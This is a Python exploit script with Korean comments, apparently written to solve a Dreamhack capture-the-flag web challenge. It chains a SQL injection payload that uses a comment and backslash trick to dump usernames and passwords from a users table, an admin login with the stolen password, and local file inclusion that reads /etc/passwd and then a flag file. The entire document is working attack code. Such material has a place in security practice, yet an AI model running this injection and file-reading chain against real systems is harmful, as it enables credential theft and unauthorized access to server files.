import requests
import re
import random

# ==========================================
# [중요] 문제 서버 URL 확인
TARGET_URL = "http://host3.dreamhack.games:16708" 
# ==========================================

def exploit():
    s = requests.Session()
    print(f"[*] 타겟 서버: {TARGET_URL}")

    # ---------------------------------------------------------
    # 단계 0: 일반 유저 가입 및 로그인
    # ---------------------------------------------------------
    username = f"user_{random.randint(1000, 9999)}"
    password = "password123"
    
    print(f"[*] 0. 일반 유저 생성 및 로그인 ({username})")
    s.post(f"{TARGET_URL}/register", data={'username': username, 'password': password})
    res = s.post(f"{TARGET_URL}/login", data={'username': username, 'password': password})
    
    if 'logout' not in res.text and 'dashboard' not in res.url:
        print("[-] 일반 유저 로그인 실패")
        return
    print("[+] 일반 유저 로그인 성공")

    # ---------------------------------------------------------
    # 단계 1: SQL Injection
    # ---------------------------------------------------------
    print("[*] 1. SQL Injection 시도")
    
    # Payload: Backslash Jamming + Strip 우회
    payload = "/*a*/union select 1,concat(username,0x3a,password),3,4,5 from users# \\"
    res = s.get(f"{TARGET_URL}/dashboard", params={'keyword': payload})

    admin_password = ""
    
    # 정규식 수정: < 문자가 나오거나, 줄이 끝나거나, 공백이 나오면 멈춤
    if 'admin:' in res.text:
        match = re.search(r'admin:(.+?)(?:<|\s|$)', res.text)
        if match:
            # [수정] 혹시 모를 따옴표(") 제거
            admin_password = match.group(1).replace('"', '').replace("'", "").strip()
            print(f"[+] Admin 패스워드 추출 성공: {admin_password}")
        else:
            print("[-] 패스워드 정규식 매칭 실패")
            return
    else:
        print("[-] SQL Injection 실패")
        return

    # ---------------------------------------------------------
    # 단계 2: Admin 로그인
    # ---------------------------------------------------------
    print("\n[*] 2. Admin 로그인 시도")
    
    login_data = {'username': 'admin', 'password': admin_password}
    res = s.post(f"{TARGET_URL}/login", data=login_data)
    
    if 'logout' in res.text or 'dashboard' in res.url:
        print("[+] Admin 로그인 성공")
    else:
        print(f"[-] Admin 로그인 실패 (패스워드: {admin_password})")
        return

    # ---------------------------------------------------------
    # 단계 3 & 4: LFI로 플래그 획득
    # ---------------------------------------------------------
    print("\n[*] 3. 플래그 위치 탐색 및 획득")
    
    # 1. /etc/passwd에서 홈 디렉터리 찾기
    res = s.get(f"{TARGET_URL}/admin", params={'filename': '/etc/passwd'})
    ctf_home = ""
    for line in res.text.split('\n'):
        if 'ctf:' in line:
            ctf_home = line.split(':')[5]
            print(f"[+] ctf 홈 디렉터리: {ctf_home}")
            break
            
    if ctf_home:
        # 2. flag.txt 읽기
        flag_res = s.get(f"{TARGET_URL}/admin", params={'filename': f"{ctf_home}/flag.txt"})
        flag = flag_res.text.strip()
        print(f"\n[SUCCESS] 플래그 발견!")
        print(f">>> {flag}")
    else:
        print("[-] ctf 유저 경로를 찾지 못했습니다.")

if __name__ == "__main__":
    exploit()